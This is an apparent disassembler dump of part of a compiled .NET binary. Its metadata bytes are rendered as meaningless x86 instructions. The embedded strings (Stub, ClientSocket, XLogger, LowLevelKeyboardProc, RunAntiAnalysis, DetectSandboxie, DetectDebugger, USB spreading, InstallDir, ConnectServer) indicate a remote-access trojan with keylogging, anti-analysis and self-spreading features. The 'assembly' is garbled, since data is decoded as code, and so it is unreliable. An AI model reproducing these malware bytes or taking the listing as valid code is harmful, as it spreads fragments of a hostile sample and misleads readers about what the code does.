  4086a4:	01 00                	add    %eax,(%eax)
  4086a6:	02 17                	add    (%edi),%dl
  4086a8:	00 00                	add    %al,(%eax)
  4086aa:	00 00                	add    %al,(%eax)
  4086ac:	04 00                	add    $0x0,%al
	...
  4086b6:	00 00                	add    %al,(%eax)
  4086b8:	01 00                	add    %eax,(%eax)
  4086ba:	23 1a                	and    (%edx),%ebx
  4086bc:	00 00                	add    %al,(%eax)
  4086be:	00 00                	add    %al,(%eax)
  4086c0:	05 00 04 00 06       	add    $0x6000400,%eax
  4086c5:	00 04 00             	add    %al,(%eax,%eax,1)
  4086c8:	11 00                	adc    %eax,(%eax)
  4086ca:	0d 00 12 00 10       	or     $0x10001200,%eax
  4086cf:	00 13                	add    %dl,(%ebx)
  4086d1:	00 10                	add    %dl,(%eax)
  4086d3:	00 15 00 0a 00 00    	add    %dl,0xa00
  4086d9:	00 10                	add    %dl,(%eax)
  4086db:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4086de:	7d 02                	jge    0x4086e2
  4086e0:	00 00                	add    %al,(%eax)
  4086e2:	10 00                	adc    %al,(%eax)
  4086e4:	19 00                	sbb    %eax,(%eax)
  4086e6:	7d 02                	jge    0x4086ea
  4086e8:	00 00                	add    %al,(%eax)
  4086ea:	00 00                	add    %al,(%eax)
  4086ec:	1b 00                	sbb    (%eax),%eax
  4086ee:	7d 02                	jge    0x4086f2
  4086f0:	2d 00 2b 03 2d       	sub    $0x2d032b00,%eax
  4086f5:	00 a6 03 cf 01 5c    	add    %ah,0x5c01cf03(%esi)
  4086fb:	08 73 02             	or     %dh,0x2(%ebx)
  4086fe:	8b 0a                	mov    (%edx),%ecx
  408700:	00 00                	add    %al,(%eax)
  408702:	00 00                	add    %al,(%eax)
  408704:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%ecx,2)
  40870b:	65 3e 00 6d 73       	gs add %ch,%ds:0x73(%ebp)
  408710:	63 6f 72             	arpl   %ebp,0x72(%edi)
  408713:	6c                   	insb   (%dx),%es:(%edi)
  408714:	69 62 00 4d 69 63 72 	imul   $0x7263694d,0x0(%edx),%esp
  40871b:	6f                   	outsl  %ds:(%esi),(%dx)
  40871c:	73 6f                	jae    0x40878d
  40871e:	66 74 2e             	data16 je 0x40874f
  408721:	56                   	push   %esi
  408722:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408729:	73 69                	jae    0x408794
  40872b:	63 00                	arpl   %eax,(%eax)
  40872d:	4d                   	dec    %ebp
  40872e:	79 41                	jns    0x408771
  408730:	70 70                	jo     0x4087a2
  408732:	6c                   	insb   (%dx),%es:(%edi)
  408733:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40873a:	00 4d 79             	add    %cl,0x79(%ebp)
  40873d:	00 4d 79             	add    %cl,0x79(%ebp)
  408740:	43                   	inc    %ebx
  408741:	6f                   	outsl  %ds:(%esi),(%dx)
  408742:	6d                   	insl   (%dx),%es:(%edi)
  408743:	70 75                	jo     0x4087ba
  408745:	74 65                	je     0x4087ac
  408747:	72 00                	jb     0x408749
  408749:	4d                   	dec    %ebp
  40874a:	79 50                	jns    0x40879c
  40874c:	72 6f                	jb     0x4087bd
  40874e:	6a 65                	push   $0x65
  408750:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  408754:	79 57                	jns    0x4087ad
  408756:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  40875a:	72 76                	jb     0x4087d2
  40875c:	69 63 65 73 00 54 68 	imul   $0x68540073,0x65(%ebx),%esp
  408763:	72 65                	jb     0x4087ca
  408765:	61                   	popa
  408766:	64 53                	fs push %ebx
  408768:	61                   	popa
  408769:	66 65 4f             	gs dec %di
  40876c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40876f:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  408773:	6f                   	outsl  %ds:(%esi),(%dx)
  408774:	76 69                	jbe    0x4087df
  408776:	64 65 72 60          	fs gs jb 0x4087da
  40877a:	31 00                	xor    %eax,(%eax)
  40877c:	53                   	push   %ebx
  40877d:	65 74 74             	gs je  0x4087f4
  408780:	69 6e 67 73 00 4d 61 	imul   $0x614d0073,0x67(%esi),%ebp
  408787:	69 6e 00 53 74 75 62 	imul   $0x62757453,0x0(%esi),%ebp
  40878e:	00 43 6c             	add    %al,0x6c(%ebx)
  408791:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  408798:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  40879c:	4d                   	dec    %ebp
  40879d:	65 73 73             	gs jae 0x408813
  4087a0:	61                   	popa
  4087a1:	67 65 73 00          	addr16 gs jae 0x4087a5
  4087a5:	55                   	push   %ebp
  4087a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4087a7:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  4087ae:	65 72 00             	gs jb  0x4087b1
  4087b1:	55                   	push   %ebp
  4087b2:	53                   	push   %ebx
  4087b3:	42                   	inc    %edx
  4087b4:	00 58 4c             	add    %bl,0x4c(%eax)
  4087b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b8:	67 67 65 72 00       	addr16 addr16 gs jb 0x4087bd
  4087bd:	50                   	push   %eax
  4087be:	72 6f                	jb     0x40882f
  4087c0:	63 65 73             	arpl   %esp,0x73(%ebp)
  4087c3:	73 43                	jae    0x408808
  4087c5:	72 69                	jb     0x408830
  4087c7:	74 69                	je     0x408832
  4087c9:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4087cc:	00 41 6c             	add    %al,0x6c(%ecx)
  4087cf:	67 6f                	outsl  %ds:(%si),(%dx)
  4087d1:	72 69                	jb     0x40883c
  4087d3:	74 68                	je     0x40883d
  4087d5:	6d                   	insl   (%dx),%es:(%edi)
  4087d6:	41                   	inc    %ecx
  4087d7:	45                   	inc    %ebp
  4087d8:	53                   	push   %ebx
  4087d9:	00 48 65             	add    %cl,0x65(%eax)
  4087dc:	6c                   	insb   (%dx),%es:(%edi)
  4087dd:	70 65                	jo     0x408844
  4087df:	72 00                	jb     0x4087e1
  4087e1:	4c                   	dec    %esp
  4087e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e3:	77 4c                	ja     0x408831
  4087e5:	65 76 65             	gs jbe 0x40884d
  4087e8:	6c                   	insb   (%dx),%es:(%edi)
  4087e9:	4b                   	dec    %ebx
  4087ea:	65 79 62             	gs jns 0x40884f
  4087ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ee:	61                   	popa
  4087ef:	72 64                	jb     0x408855
  4087f1:	50                   	push   %eax
  4087f2:	72 6f                	jb     0x408863
  4087f4:	63 00                	arpl   %eax,(%eax)
  4087f6:	4c                   	dec    %esp
  4087f7:	41                   	inc    %ecx
  4087f8:	53                   	push   %ebx
  4087f9:	54                   	push   %esp
  4087fa:	49                   	dec    %ecx
  4087fb:	4e                   	dec    %esi
  4087fc:	50                   	push   %eax
  4087fd:	55                   	push   %ebp
  4087fe:	54                   	push   %esp
  4087ff:	49                   	dec    %ecx
  408800:	4e                   	dec    %esi
  408801:	46                   	inc    %esi
  408802:	4f                   	dec    %edi
  408803:	00 45 58             	add    %al,0x58(%ebp)
  408806:	45                   	inc    %ebp
  408807:	43                   	inc    %ebx
  408808:	55                   	push   %ebp
  408809:	54                   	push   %esp
  40880a:	49                   	dec    %ecx
  40880b:	4f                   	dec    %edi
  40880c:	4e                   	dec    %esi
  40880d:	5f                   	pop    %edi
  40880e:	53                   	push   %ebx
  40880f:	54                   	push   %esp
  408810:	41                   	inc    %ecx
  408811:	54                   	push   %esp
  408812:	45                   	inc    %ebp
  408813:	00 4d 69             	add    %cl,0x69(%ebp)
  408816:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408819:	73 6f                	jae    0x40888a
  40881b:	66 74 2e             	data16 je 0x40884c
  40881e:	56                   	push   %esi
  40881f:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408826:	73 69                	jae    0x408891
  408828:	63 2e                	arpl   %ebp,(%esi)
  40882a:	41                   	inc    %ecx
  40882b:	70 70                	jo     0x40889d
  40882d:	6c                   	insb   (%dx),%es:(%edi)
  40882e:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408835:	53                   	push   %ebx
  408836:	65 72 76             	gs jb  0x4088af
  408839:	69 63 65 73 00 41 70 	imul   $0x70410073,0x65(%ebx),%esp
  408840:	70 6c                	jo     0x4088ae
  408842:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408849:	42                   	inc    %edx
  40884a:	61                   	popa
  40884b:	73 65                	jae    0x4088b2
  40884d:	00 2e                	add    %ch,(%esi)
  40884f:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  408853:	00 4d 69             	add    %cl,0x69(%ebp)
  408856:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408859:	73 6f                	jae    0x4088ca
  40885b:	66 74 2e             	data16 je 0x40888c
  40885e:	56                   	push   %esi
  40885f:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408866:	73 69                	jae    0x4088d1
  408868:	63 2e                	arpl   %ebp,(%esi)
  40886a:	44                   	inc    %esp
  40886b:	65 76 69             	gs jbe 0x4088d7
  40886e:	63 65 73             	arpl   %esp,0x73(%ebp)
  408871:	00 43 6f             	add    %al,0x6f(%ebx)
  408874:	6d                   	insl   (%dx),%es:(%edi)
  408875:	70 75                	jo     0x4088ec
  408877:	74 65                	je     0x4088de
  408879:	72 00                	jb     0x40887b
  40887b:	53                   	push   %ebx
  40887c:	79 73                	jns    0x4088f1
  40887e:	74 65                	je     0x4088e5
  408880:	6d                   	insl   (%dx),%es:(%edi)
  408881:	00 4f 62             	add    %cl,0x62(%edi)
  408884:	6a 65                	push   $0x65
  408886:	63 74 00 2e          	arpl   %esi,0x2e(%eax,%eax,1)
  40888a:	63 63 74             	arpl   %esp,0x74(%ebx)
  40888d:	6f                   	outsl  %ds:(%esi),(%dx)
  40888e:	72 00                	jb     0x408890
  408890:	67 65 74 5f          	addr16 gs je 0x4088f3
  408894:	43                   	inc    %ebx
  408895:	6f                   	outsl  %ds:(%esi),(%dx)
  408896:	6d                   	insl   (%dx),%es:(%edi)
  408897:	70 75                	jo     0x40890e
  408899:	74 65                	je     0x408900
  40889b:	72 00                	jb     0x40889d
  40889d:	6d                   	insl   (%dx),%es:(%edi)
  40889e:	5f                   	pop    %edi
  40889f:	43                   	inc    %ebx
  4088a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a1:	6d                   	insl   (%dx),%es:(%edi)
  4088a2:	70 75                	jo     0x408919
  4088a4:	74 65                	je     0x40890b
  4088a6:	72 4f                	jb     0x4088f7
  4088a8:	62 6a 65             	bound  %ebp,0x65(%edx)
  4088ab:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  4088af:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b0:	76 69                	jbe    0x40891b
  4088b2:	64 65 72 00          	fs gs jb 0x4088b6
  4088b6:	67 65 74 5f          	addr16 gs je 0x408919
  4088ba:	41                   	inc    %ecx
  4088bb:	70 70                	jo     0x40892d
  4088bd:	6c                   	insb   (%dx),%es:(%edi)
  4088be:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4088c5:	00 6d 5f             	add    %ch,0x5f(%ebp)
  4088c8:	41                   	inc    %ecx
  4088c9:	70 70                	jo     0x40893b
  4088cb:	4f                   	dec    %edi
  4088cc:	62 6a 65             	bound  %ebp,0x65(%edx)
  4088cf:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  4088d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d4:	76 69                	jbe    0x40893f
  4088d6:	64 65 72 00          	fs gs jb 0x4088da
  4088da:	55                   	push   %ebp
  4088db:	73 65                	jae    0x408942
  4088dd:	72 00                	jb     0x4088df
  4088df:	67 65 74 5f          	addr16 gs je 0x408942
  4088e3:	55                   	push   %ebp
  4088e4:	73 65                	jae    0x40894b
  4088e6:	72 00                	jb     0x4088e8
  4088e8:	6d                   	insl   (%dx),%es:(%edi)
  4088e9:	5f                   	pop    %edi
  4088ea:	55                   	push   %ebp
  4088eb:	73 65                	jae    0x408952
  4088ed:	72 4f                	jb     0x40893e
  4088ef:	62 6a 65             	bound  %ebp,0x65(%edx)
  4088f2:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  4088f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4088f7:	76 69                	jbe    0x408962
  4088f9:	64 65 72 00          	fs gs jb 0x4088fd
  4088fd:	67 65 74 5f          	addr16 gs je 0x408960
  408901:	57                   	push   %edi
  408902:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  408906:	72 76                	jb     0x40897e
  408908:	69 63 65 73 00 6d 5f 	imul   $0x5f6d0073,0x65(%ebx),%esp
  40890f:	4d                   	dec    %ebp
  408910:	79 57                	jns    0x408969
  408912:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  408916:	72 76                	jb     0x40898e
  408918:	69 63 65 73 4f 62 6a 	imul   $0x6a624f73,0x65(%ebx),%esp
  40891f:	65 63 74 50 72       	arpl   %esi,%gs:0x72(%eax,%edx,2)
  408924:	6f                   	outsl  %ds:(%esi),(%dx)
  408925:	76 69                	jbe    0x408990
  408927:	64 65 72 00          	fs gs jb 0x40892b
  40892b:	41                   	inc    %ecx
  40892c:	70 70                	jo     0x40899e
  40892e:	6c                   	insb   (%dx),%es:(%edi)
  40892f:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408936:	00 57 65             	add    %dl,0x65(%edi)
  408939:	62 53 65             	bound  %edx,0x65(%ebx)
  40893c:	72 76                	jb     0x4089b4
  40893e:	69 63 65 73 00 45 71 	imul   $0x71450073,0x65(%ebx),%esp
  408945:	75 61                	jne    0x4089a8
  408947:	6c                   	insb   (%dx),%es:(%edi)
  408948:	73 00                	jae    0x40894a
  40894a:	6f                   	outsl  %ds:(%esi),(%dx)
  40894b:	00 47 65             	add    %al,0x65(%edi)
  40894e:	74 48                	je     0x408998
  408950:	61                   	popa
  408951:	73 68                	jae    0x4089bb
  408953:	43                   	inc    %ebx
  408954:	6f                   	outsl  %ds:(%esi),(%dx)
  408955:	64 65 00 54 79 70    	fs add %dl,%gs:0x70(%ecx,%edi,2)
  40895b:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40895f:	74 54                	je     0x4089b5
  408961:	79 70                	jns    0x4089d3
  408963:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  408968:	74 72                	je     0x4089dc
  40896a:	69 6e 67 00 43 72 65 	imul   $0x65724300,0x67(%esi),%ebp
  408971:	61                   	popa
  408972:	74 65                	je     0x4089d9
  408974:	5f                   	pop    %edi
  408975:	5f                   	pop    %edi
  408976:	49                   	dec    %ecx
  408977:	6e                   	outsb  %ds:(%esi),(%dx)
  408978:	73 74                	jae    0x4089ee
  40897a:	61                   	popa
  40897b:	6e                   	outsb  %ds:(%esi),(%dx)
  40897c:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40897f:	5f                   	pop    %edi
  408980:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  408984:	6e                   	outsb  %ds:(%esi),(%dx)
  408985:	73 74                	jae    0x4089fb
  408987:	61                   	popa
  408988:	6e                   	outsb  %ds:(%esi),(%dx)
  408989:	63 65 00             	arpl   %esp,0x0(%ebp)
  40898c:	44                   	inc    %esp
  40898d:	69 73 70 6f 73 65 5f 	imul   $0x5f65736f,0x70(%ebx),%esi
  408994:	5f                   	pop    %edi
  408995:	49                   	dec    %ecx
  408996:	6e                   	outsb  %ds:(%esi),(%dx)
  408997:	73 74                	jae    0x408a0d
  408999:	61                   	popa
  40899a:	6e                   	outsb  %ds:(%esi),(%dx)
  40899b:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40899e:	5f                   	pop    %edi
  40899f:	00 67 65             	add    %ah,0x65(%edi)
  4089a2:	74 5f                	je     0x408a03
  4089a4:	47                   	inc    %edi
  4089a5:	65 74 49             	gs je  0x4089f1
  4089a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a9:	73 74                	jae    0x408a1f
  4089ab:	61                   	popa
  4089ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ad:	63 65 00             	arpl   %esp,0x0(%ebp)
  4089b0:	6d                   	insl   (%dx),%es:(%edi)
  4089b1:	5f                   	pop    %edi
  4089b2:	54                   	push   %esp
  4089b3:	68 72 65 61 64       	push   $0x64616572
  4089b8:	53                   	push   %ebx
  4089b9:	74 61                	je     0x408a1c
  4089bb:	74 69                	je     0x408a26
  4089bd:	63 56 61             	arpl   %edx,0x61(%esi)
  4089c0:	6c                   	insb   (%dx),%es:(%edi)
  4089c1:	75 65                	jne    0x408a28
  4089c3:	00 47 65             	add    %al,0x65(%edi)
  4089c6:	74 49                	je     0x408a11
  4089c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c9:	73 74                	jae    0x408a3f
  4089cb:	61                   	popa
  4089cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cd:	63 65 00             	arpl   %esp,0x0(%ebp)
  4089d0:	48                   	dec    %eax
  4089d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d2:	73 74                	jae    0x408a48
  4089d4:	73 00                	jae    0x4089d6
  4089d6:	48                   	dec    %eax
  4089d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d8:	73 74                	jae    0x408a4e
  4089da:	00 50 6f             	add    %dl,0x6f(%eax)
  4089dd:	72 74                	jb     0x408a53
  4089df:	00 4b 45             	add    %cl,0x45(%ebx)
  4089e2:	59                   	pop    %ecx
  4089e3:	00 53 50             	add    %dl,0x50(%ebx)
  4089e6:	4c                   	dec    %esp
  4089e7:	00 53 6c             	add    %dl,0x6c(%ebx)
  4089ea:	65 65 70 00          	gs gs jo 0x4089ee
  4089ee:	47                   	inc    %edi
  4089ef:	72 6f                	jb     0x408a60
  4089f1:	75 70                	jne    0x408a63
  4089f3:	00 55 53             	add    %dl,0x53(%ebp)
  4089f6:	42                   	inc    %edx
  4089f7:	4e                   	dec    %esi
  4089f8:	4d                   	dec    %ebp
  4089f9:	00 49 6e             	add    %cl,0x6e(%ecx)
  4089fc:	73 74                	jae    0x408a72
  4089fe:	61                   	popa
  4089ff:	6c                   	insb   (%dx),%es:(%edi)
  408a00:	6c                   	insb   (%dx),%es:(%edi)
  408a01:	44                   	inc    %esp
  408a02:	69 72 00 49 6e 73 74 	imul   $0x74736e49,0x0(%edx),%esi
  408a09:	61                   	popa
  408a0a:	6c                   	insb   (%dx),%es:(%edi)
  408a0b:	6c                   	insb   (%dx),%es:(%edi)
  408a0c:	53                   	push   %ebx
  408a0d:	74 72                	je     0x408a81
  408a0f:	00 4d 75             	add    %cl,0x75(%ebp)
  408a12:	74 65                	je     0x408a79
  408a14:	78 00                	js     0x408a16
  408a16:	4c                   	dec    %esp
  408a17:	6f                   	outsl  %ds:(%esi),(%dx)
  408a18:	67 67 65 72 50       	addr16 addr16 gs jb 0x408a6d
  408a1d:	61                   	popa
  408a1e:	74 68                	je     0x408a88
  408a20:	00 45 78             	add    %al,0x78(%ebp)
  408a23:	63 6c 75 73          	arpl   %ebp,0x73(%ebp,%esi,2)
  408a27:	69 6f 6e 00 52 75 6e 	imul   $0x6e755200,0x6e(%edi),%ebp
  408a2e:	41                   	inc    %ecx
  408a2f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a30:	74 69                	je     0x408a9b
  408a32:	41                   	inc    %ecx
  408a33:	6e                   	outsb  %ds:(%esi),(%dx)
  408a34:	61                   	popa
  408a35:	6c                   	insb   (%dx),%es:(%edi)
  408a36:	79 73                	jns    0x408aab
  408a38:	69 73 00 61 6e 79 72 	imul   $0x72796e61,0x0(%ebx),%esi
  408a3f:	75 6e                	jne    0x408aaf
  408a41:	00 49 73             	add    %cl,0x73(%ecx)
  408a44:	58                   	pop    %eax
  408a45:	50                   	push   %eax
  408a46:	00 44 65 74          	add    %al,0x74(%ebp,%eiz,2)
  408a4a:	65 63 74 4d 61       	arpl   %esi,%gs:0x61(%ebp,%ecx,2)
  408a4f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a50:	75 66                	jne    0x408ab8
  408a52:	61                   	popa
  408a53:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408a57:	65 72 00             	gs jb  0x408a5a
  408a5a:	44                   	inc    %esp
  408a5b:	65 74 65             	gs je  0x408ac3
  408a5e:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408a62:	62 75 67             	bound  %esi,0x67(%ebp)
  408a65:	67 65 72 00          	addr16 gs jb 0x408a69
  408a69:	44                   	inc    %esp
  408a6a:	65 74 65             	gs je  0x408ad2
  408a6d:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  408a71:	6e                   	outsb  %ds:(%esi),(%dx)
  408a72:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  408a76:	69 65 00 47 65 74 4d 	imul   $0x4d746547,0x0(%ebp),%esp
  408a7d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7e:	64 75 6c             	fs jne 0x408aed
  408a81:	65 48                	gs dec %eax
  408a83:	61                   	popa
  408a84:	6e                   	outsb  %ds:(%esi),(%dx)
  408a85:	64 6c                	fs insb (%dx),%es:(%edi)
  408a87:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  408a8c:	6f                   	outsl  %ds:(%esi),(%dx)
  408a8d:	64 75 6c             	fs jne 0x408afc
  408a90:	65 4e                	gs dec %esi
  408a92:	61                   	popa
  408a93:	6d                   	insl   (%dx),%es:(%edi)
  408a94:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408a98:	65 63 6b 52          	arpl   %ebp,%gs:0x52(%ebx)
  408a9c:	65 6d                	gs insl (%dx),%es:(%edi)
  408a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  408a9f:	74 65                	je     0x408b06
  408aa1:	44                   	inc    %esp
  408aa2:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408aa6:	67 65 72 50          	addr16 gs jb 0x408afa
  408aaa:	72 65                	jb     0x408b11
  408aac:	73 65                	jae    0x408b13
  408aae:	6e                   	outsb  %ds:(%esi),(%dx)
  408aaf:	74 00                	je     0x408ab1
  408ab1:	68 50 72 6f 63       	push   $0x636f7250
  408ab6:	65 73 73             	gs jae 0x408b2c
  408ab9:	00 69 73             	add    %ch,0x73(%ecx)
  408abc:	44                   	inc    %esp
  408abd:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408ac1:	67 65 72 50          	addr16 gs jb 0x408b15
  408ac5:	72 65                	jb     0x408b2c
  408ac7:	73 65                	jae    0x408b2e
  408ac9:	6e                   	outsb  %ds:(%esi),(%dx)
  408aca:	74 00                	je     0x408acc
  408acc:	69 73 43 6f 6e 6e 65 	imul   $0x656e6e6f,0x43(%ebx),%esi
  408ad3:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  408ad7:	00 53 79             	add    %dl,0x79(%ebx)
  408ada:	73 74                	jae    0x408b50
  408adc:	65 6d                	gs insl (%dx),%es:(%edi)
  408ade:	2e 4e                	cs dec %esi
  408ae0:	65 74 2e             	gs je  0x408b11
  408ae3:	53                   	push   %ebx
  408ae4:	6f                   	outsl  %ds:(%esi),(%dx)
  408ae5:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408ae8:	74 73                	je     0x408b5d
  408aea:	00 53 6f             	add    %dl,0x6f(%ebx)
  408aed:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408af0:	74 00                	je     0x408af2
  408af2:	53                   	push   %ebx
  408af3:	00 42 75             	add    %al,0x75(%edx)
  408af6:	66 66 65 72 4c       	data16 data16 gs jb 0x408b47
  408afb:	65 6e                	outsb  %gs:(%esi),(%dx)
  408afd:	67 74 68             	addr16 je 0x408b68
  408b00:	00 42 75             	add    %al,0x75(%edx)
  408b03:	66 66 65 72 00       	data16 data16 gs jb 0x408b08
  408b08:	53                   	push   %ebx
  408b09:	79 73                	jns    0x408b7e
  408b0b:	74 65                	je     0x408b72
  408b0d:	6d                   	insl   (%dx),%es:(%edi)
  408b0e:	2e 49                	cs dec %ecx
  408b10:	4f                   	dec    %edi
  408b11:	00 4d 65             	add    %cl,0x65(%ebp)
  408b14:	6d                   	insl   (%dx),%es:(%edi)
  408b15:	6f                   	outsl  %ds:(%esi),(%dx)
  408b16:	72 79                	jb     0x408b91
  408b18:	53                   	push   %ebx
  408b19:	74 72                	je     0x408b8d
  408b1b:	65 61                	gs popa
  408b1d:	6d                   	insl   (%dx),%es:(%edi)
  408b1e:	00 4d 53             	add    %cl,0x53(%ebp)
  408b21:	00 53 79             	add    %dl,0x79(%ebx)
  408b24:	73 74                	jae    0x408b9a
  408b26:	65 6d                	gs insl (%dx),%es:(%edi)
  408b28:	2e 54                	cs push %esp
  408b2a:	68 72 65 61 64       	push   $0x64616572
  408b2f:	69 6e 67 00 54 69 6d 	imul   $0x6d695400,0x67(%esi),%ebp
  408b36:	65 72 00             	gs jb  0x408b39
  408b39:	54                   	push   %esp
  408b3a:	69 63 6b 00 4d 61 6e 	imul   $0x6e614d00,0x6b(%ebx),%esp
  408b41:	75 61                	jne    0x408ba4
  408b43:	6c                   	insb   (%dx),%es:(%edi)
  408b44:	52                   	push   %edx
  408b45:	65 73 65             	gs jae 0x408bad
  408b48:	74 45                	je     0x408b8f
  408b4a:	76 65                	jbe    0x408bb1
  408b4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b4d:	74 00                	je     0x408b4f
  408b4f:	61                   	popa
  408b50:	6c                   	insb   (%dx),%es:(%edi)
  408b51:	6c                   	insb   (%dx),%es:(%edi)
  408b52:	44                   	inc    %esp
  408b53:	6f                   	outsl  %ds:(%esi),(%dx)
  408b54:	6e                   	outsb  %ds:(%esi),(%dx)
  408b55:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  408b59:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5a:	64 53                	fs push %ebx
  408b5c:	79 6e                	jns    0x408bcc
  408b5e:	63 00                	arpl   %eax,(%eax)
  408b60:	53                   	push   %ebx
  408b61:	70 65                	jo     0x408bc8
  408b63:	65 64 00 49 6e       	gs add %cl,%fs:0x6e(%ecx)
  408b68:	74 65                	je     0x408bcf
  408b6a:	72 76                	jb     0x408be2
  408b6c:	61                   	popa
  408b6d:	6c                   	insb   (%dx),%es:(%edi)
  408b6e:	00 41 63             	add    %al,0x63(%ecx)
  408b71:	74 69                	je     0x408bdc
  408b73:	76 61                	jbe    0x408bd6
  408b75:	74 65                	je     0x408bdc
  408b77:	50                   	push   %eax
  408b78:	6f                   	outsl  %ds:(%esi),(%dx)
  408b79:	6e                   	outsb  %ds:(%esi),(%dx)
  408b7a:	67 00 42 65          	add    %al,0x65(%bp,%si)
  408b7e:	67 69 6e 43 6f 6e 6e 	imul   $0x656e6e6f,0x43(%bp),%ebp
  408b85:	65 
  408b86:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  408b8a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b8b:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8d:	65 63 74 53 65       	arpl   %esi,%gs:0x65(%ebx,%edx,2)
  408b92:	72 76                	jb     0x408c0a
  408b94:	65 72 00             	gs jb  0x408b97
  408b97:	48                   	dec    %eax
  408b98:	00 49 6e             	add    %cl,0x6e(%ecx)
  408b9b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408b9d:	00 49 4e             	add    %cl,0x4e(%ecx)
  408ba0:	44                   	inc    %esp
  408ba1:	41                   	inc    %ecx
  408ba2:	54                   	push   %esp
  408ba3:	45                   	inc    %ebp
  408ba4:	00 53 70             	add    %dl,0x70(%ebx)
  408ba7:	72 65                	jb     0x408c0e
  408ba9:	61                   	popa
  408baa:	64 00 55 41          	add    %dl,%fs:0x41(%ebp)
  408bae:	43                   	inc    %ebx
  408baf:	00 41 6e             	add    %al,0x6e(%ecx)
  408bb2:	74 69                	je     0x408c1d
  408bb4:	76 69                	jbe    0x408c1f
  408bb6:	72 75                	jb     0x408c2d
  408bb8:	73 00                	jae    0x408bba
  408bba:	47                   	inc    %edi
  408bbb:	50                   	push   %eax
  408bbc:	55                   	push   %ebp
  408bbd:	00 43 50             	add    %al,0x50(%ebx)
  408bc0:	55                   	push   %ebp
  408bc1:	00 52 41             	add    %dl,0x41(%edx)
  408bc4:	4d                   	dec    %ebp
  408bc5:	00 49 41             	add    %cl,0x41(%ecx)
  408bc8:	73 79                	jae    0x408c43
  408bca:	6e                   	outsb  %ds:(%esi),(%dx)
  408bcb:	63 52 65             	arpl   %edx,0x65(%edx)
  408bce:	73 75                	jae    0x408c45
  408bd0:	6c                   	insb   (%dx),%es:(%edi)
  408bd1:	74 00                	je     0x408bd3
  408bd3:	42                   	inc    %edx
  408bd4:	65 67 69 6e 52 65 63 	imul   $0x69656365,%gs:0x52(%bp),%ebp
  408bdb:	65 69 
  408bdd:	76 65                	jbe    0x408c44
  408bdf:	00 61 72             	add    %ah,0x72(%ecx)
  408be2:	00 42 65             	add    %al,0x65(%edx)
  408be5:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  408bec:	00 
  408bed:	62 00                	bound  %eax,(%eax)
